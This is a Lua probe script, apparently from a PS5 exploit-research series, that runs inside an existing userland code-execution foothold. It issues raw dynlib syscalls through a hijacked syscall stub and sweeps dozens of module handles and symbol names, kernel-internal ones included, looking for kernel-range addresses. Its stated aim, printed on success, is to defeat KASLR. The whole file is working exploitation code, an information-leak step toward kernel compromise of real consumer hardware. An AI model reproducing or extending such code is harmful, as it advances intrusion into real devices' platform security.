-- CRASH_CLASS: LOW
-- PROBE 69k: Deep dynlib_dlsym(591) sweep — all modules × expanded symbol set
--
-- 69c2 tests 5 handles × 18 names plus NID format and arg variants.
-- This probe extends the search:
--   [A] All 39+ module handles × 40 symbol names → catalog what resolves
--   [B] Resolved addresses → scan for kernel pointer range (KASLR)
--   [C] Cross-reference: do different handles resolve the same symbol to
--       different addresses? (would reveal per-module trampolines)
--   [D] Try handle=-1 / 0xFFFE / 0xFFFF as RTLD_DEFAULT/NEXT-like wildcards
--       with the FULL symbol list (69c2 only tested "printf")
--   [E] Try kernel-sounding names (sysctl, copyin, copyout, uma_zalloc)
--       on the off chance the resolver doesn't filter kernel symbols

print("=== PROBE 69k: DLSYM DEEP SWEEP ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)

local sc591 = mk(591)
local out_addr = memory.alloc(8)

-- ============================================================
-- [A] ENUMERATE ALL MODULE HANDLES
-- ============================================================
print("[A] Module enumeration")
local handles = {}
local info = memory.alloc(0x200)
for h = 0, 50 do
    wd(N(info), 0x160)
    for i = 4, 0x1FC, 4 do wd(N(info) + i, 0) end
    local ok, rv = pcall(function() return mk(593)(uint64(h), info) end)
    if ok and sgn(rv) == 0 then
        table.insert(handles, h)
    end
end
print("  modules: " .. #handles)
if not alive() then print("DEAD"); return end

-- ============================================================
-- [B] FULL SYMBOL SWEEP: all handles × expanded name list
-- ============================================================
print("")
print("[B] Full symbol sweep")

local symbols = {
    -- C standard
    "printf", "sprintf", "snprintf", "fprintf",
    "malloc", "calloc", "realloc", "free",
    "memcpy", "memmove", "memset", "memcmp",
    "strlen", "strcmp", "strncmp", "strcpy", "strncpy", "strstr",
    "open", "close", "read", "write",
    "mmap", "munmap", "mprotect",
    "socket", "connect", "bind", "listen", "accept",
    "ioctl", "fcntl", "select", "poll",
    "getpid", "getuid", "geteuid",
    "exit", "_exit", "abort",
    -- PS5 SCE
    "sceKernelDlsym",
    "sceKernelGetModuleInfo",
    "sceKernelLoadStartModule",
    "sceKernelStopUnloadModule",
    "sceKernelGetProcessTime",
    "sceKernelGetCurrentCpu",
    "sceKernelSendNotificationRequest",
    "sceKernelDebugOutText",
    "sceKernelGetCompiledSdkVersion",
    "scePthreadCreate",
    "scePthreadJoin",
    "scePthreadMutexInit",
    "scePthreadMutexLock",
    "scePthreadMutexUnlock",
    -- FreeBSD internal (kernel symbol speculation)
    "sysctl", "sysctlbyname",
    "copyin", "copyout", "copyinstr",
    "uma_zalloc", "uma_zfree",
    "kern_sysctl",
    "prison_check",
    "crfree", "crhold",
    "kthread_add",
    "knote",
    "soupcall_set",
    "vn_open",
    "VOP_READ",
    "__stack_chk_fail",
    "__error",
    "thr_exit",
    "sigaction",
    "sysarch",
}

local resolved_map = {}
local kptr_count = 0
local total_resolved = 0

for _, handle in ipairs(handles) do
    if not alive() then print("DEAD at handle " .. handle); break end
    local handle_resolved = 0
    for _, sym in ipairs(symbols) do
        wq(N(out_addr), uint64(0xDEADDEAD))
        local name_ptr = put_str(sym)
        local ok, rv = pcall(function()
            return sc591(uint64(handle), uint64(N(name_ptr)), uint64(N(out_addr)))
        end)
        local ret = ok and sgn(rv) or -999
        if ret == 0 then
            local addr = rq(N(out_addr))
            if addr then
                local ah, al = get_hi_lo(addr)
                handle_resolved = handle_resolved + 1
                total_resolved = total_resolved + 1

                if not resolved_map[sym] then
                    resolved_map[sym] = {}
                end
                table.insert(resolved_map[sym], {h = handle, addr = addr})

                if ah >= 0xFFFF8000 and ah ~= 0xFFFFFFFF then
                    kptr_count = kptr_count + 1
                    print(string.format("  *** KPTR h=%d %s -> %s ***", handle, sym, fmt(addr)))
                end
            end
        end
    end
    if handle_resolved > 0 then
        print(string.format("  handle=%d: %d/%d resolved", handle, handle_resolved, #symbols))
    end
end

print(string.format("  TOTAL resolved: %d  kptr: %d", total_resolved, kptr_count))
if not alive() then print("DEAD"); return end

-- ============================================================
-- [C] CROSS-REFERENCE: same symbol, different handle → different addr?
-- ============================================================
print("")
print("[C] Cross-reference: per-module address differences")
local cross_count = 0
for sym, entries in pairs(resolved_map) do
    if #entries >= 2 then
        local first = entries[1].addr
        local differ = false
        for i = 2, #entries do
            local fh, fl = get_hi_lo(first)
            local eh, el = get_hi_lo(entries[i].addr)
            if fh ~= eh or fl ~= el then
                differ = true
                break
            end
        end
        if differ then
            cross_count = cross_count + 1
            if cross_count <= 10 then
                local parts = {}
                for _, e in ipairs(entries) do
                    table.insert(parts, string.format("h%d=%s", e.h, fmt(e.addr)))
                end
                print(string.format("  %s: %s", sym, table.concat(parts, " ")))
            end
        end
    end
end
print(string.format("  symbols with per-module variation: %d", cross_count))

-- ============================================================
-- [D] WILDCARD HANDLES × full symbol list
-- ============================================================
print("")
print("[D] Wildcard handles")

local wildcards = {0xFFFF, 0xFFFE, 0xFFFD, 0x2001, 0x4001, 0xFFFFFFFF}
for _, wh in ipairs(wildcards) do
    if not alive() then break end
    local wc_resolved = 0
    local first_addr = nil
    local first_sym = nil
    for _, sym in ipairs(symbols) do
        wq(N(out_addr), uint64(0xDEADDEAD))
        local name_ptr = put_str(sym)
        local ok, rv = pcall(function()
            return sc591(uint64(wh), uint64(N(name_ptr)), uint64(N(out_addr)))
        end)
        local ret = ok and sgn(rv) or -999
        if ret == 0 then
            local addr = rq(N(out_addr))
            if addr then
                wc_resolved = wc_resolved + 1
                local ah, al = get_hi_lo(addr)
                if ah >= 0xFFFF8000 and ah ~= 0xFFFFFFFF then
                    kptr_count = kptr_count + 1
                    print(string.format("  *** KPTR wh=0x%X %s -> %s ***", wh, sym, fmt(addr)))
                end
                if not first_addr then
                    first_addr = addr
                    first_sym = sym
                end
            end
        end
    end
    local tag = ""
    if first_addr then tag = string.format(" (first: %s=%s)", first_sym, fmt(first_addr)) end
    print(string.format("  wh=0x%X: %d/%d resolved%s", wh, wc_resolved, #symbols, tag))
end

-- ============================================================
-- [E] PRINT ALL RESOLVED SYMBOLS WITH ADDRESSES (catalog)
-- ============================================================
print("")
print("[E] Resolved symbol catalog")
local catalog = {}
for sym, entries in pairs(resolved_map) do
    table.insert(catalog, {sym = sym, addr = entries[1].addr, count = #entries})
end
table.sort(catalog, function(a, b) return a.sym < b.sym end)

for _, entry in ipairs(catalog) do
    local ah, al = get_hi_lo(entry.addr)
    local tag = ""
    if ah >= 0xFFFF8000 and ah ~= 0xFFFFFFFF then tag = " *** KERNEL ***" end
    print(string.format("  %s -> %s (x%d)%s", entry.sym, fmt(entry.addr), entry.count, tag))
end

print("")
print(string.format("SUMMARY: %d symbols resolved, %d kernel pointers, %d modules",
    total_resolved, kptr_count, #handles))
if kptr_count > 0 then
    print("*** KASLR DEFEAT VIA DLSYM ***")
end
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 69k COMPLETE ===")
